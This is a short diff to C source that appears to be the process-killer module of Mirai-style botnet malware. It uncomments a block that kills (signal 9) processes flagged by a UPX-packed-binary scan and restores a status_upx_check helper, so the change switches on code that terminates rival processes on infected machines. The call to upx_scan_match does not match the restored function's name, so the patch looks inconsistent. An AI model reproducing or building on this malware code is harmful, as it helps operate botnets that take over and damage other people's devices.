@@ -220,7 +220,7 @@ void killer_init(void)
                 kill(pid, 9);
             } 
 
-            /*
+            
             if (upx_scan_match(exe_path, status_path))
             {
 #ifdef DEBUG
@@ -228,7 +228,7 @@ void killer_init(void)
 #endif
                 kill(pid, 9);
             }
-            */
+            
 
             // Don't let others memory scan!!!
             util_zero(exe_path, sizeof (exe_path));
@@ -457,7 +457,7 @@ static BOOL has_exe_access(void)
     return TRUE;
 }
 
-/*
+
 static BOOL status_upx_check(char *exe_path, char *status_path)
 {
     int fd, ret;
@@ -489,7 +489,7 @@ static BOOL status_upx_check(char *exe_path, char *status_path)
     close(fd);
     return FALSE;
 }
-*/
+
 
 static BOOL memory_scan_match(char *path)
 {
